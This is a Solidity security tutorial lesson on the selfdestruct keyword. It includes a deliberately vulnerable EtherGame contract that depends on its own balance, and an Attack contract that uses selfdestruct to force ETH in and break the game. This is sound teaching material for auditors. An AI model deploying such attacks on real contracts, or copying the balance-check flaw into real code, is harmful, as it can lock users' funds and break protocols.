---
title: Self-destruct
---

_follow along with the video_

---

## Forever On-chain ... mostly

The next concept I want you to know is that of the `selfdestruct()` keyword in Solidity. In essence this keyword will destroy, or delete a contract.

## The Unique Characteristic of Selfdestruct

Why `selfdestruct` stands out lies in its exceptional behavior once a contract gets destroyed. Any Ethereum (or ETH) residing within the deleted contract gets automatically ‘pushed’ or ‘forced’ into any address that you specify.

Under normal circumstances a contract that doesn't contain a receive or fallback function (or some other payable function capable of receiving funds) cannot have ETH sent to it.

Only through the use of `selfdestruct` can you be permitted to push any Ethereum into such a contract.

So if ever you’re hunting for an exploit, or you have identified an attack where you need to force ETH into a contract, `selfdestruct` will be your instrument of choice.

## `selfdestruct` in Action

To get a clear understanding, let’s put these into practice. Starting with a code base from [Solidity by example](https://solidity-by-example.org/hacks/self-destruct/) - and then carrying it into Remix, we will be able to observe this concept directly in action.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// The goal of this game is to be the 7th player to deposit 1 Ether.
// Players can deposit only 1 Ether at a time.
// Winner will be able to withdraw all Ether.

/*
1. Deploy EtherGame
2. Players (say Alice and Bob) decides to play, deposits 1 Ether each.
2. Deploy Attack with address of EtherGame
3. Call Attack.attack sending 5 ether. This will break the game
   No one can become the winner.

What happened?
Attack forced the balance of EtherGame to equal 7 ether.
Now no one can deposit and the winner cannot be set.
*/

contract EtherGame {
    uint public targetAmount = 7 ether;
    address public winner;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        uint balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

```

Looking closely at the above contracts, we can see that `EtherGame` requires `address(this).balance == targetAmount`. The expectation of the protocol is that any user can only deposit 1ETH and each deposit transaction is checked as a winner.

Can you think of how we'd break these invariants?

By leveraging `selfdestruct(payable(address(etherGame)));` on our `Attack` contract, we can force ETH to the `EtherGame` contract that isn't accounted for.

```js
if (balance == targetAmount) {
  winner = msg.sender;
}
```

By forcing enough ETH to `EtherGame` we can assure the above condition is never met and a winner is never decided!

## Conclusion

The `selfdestruct()` function is powerful. It's one of the only ways to force a contract to receive ETH that it doesn't want and in so doing exists as an attack vector for any protocol not prepared for it.
